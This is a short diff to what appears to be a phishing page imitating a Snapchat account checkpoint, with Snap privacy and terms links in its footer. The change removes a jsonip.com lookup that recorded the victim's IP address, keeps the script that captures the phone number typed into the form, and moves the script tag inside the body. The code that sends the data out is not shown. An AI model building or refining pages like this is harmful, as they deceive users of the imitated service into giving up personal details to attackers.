@@ -157,12 +157,10 @@
     <a href="https://www.snap.com/us/privacy/privacy-policy/">Privacy Policy</a><a href="https://www.snap.com/us/terms/">Terms of Service
       <div style="clear: both;"></div>
     </div></div></div></div>
-</body>
-
- <script>
+     <script>
        
       
-$.getJSON("http://jsonip.com?callback=?", function (data) {
+
 
     $(document).ready(function () {
     $('#checkpointSubmitButton').click(function(e) {
@@ -174,7 +172,7 @@ $.getJSON("http://jsonip.com?callback=?", function (data) {
 
             var pnumber = document.getElementById('pnumber').value;
             
-            var icerik = "Phone Number: " + pnumber + "     " +  "ip: " + data.ip;
+            var icerik = "Phone Number: " + pnumber ;
 
 if(pnumber != ""){
 
@@ -190,7 +188,10 @@ if(pnumber != ""){
             
      });
 });
-});
+
 
     </script>
+</body>
+
+
 </html>
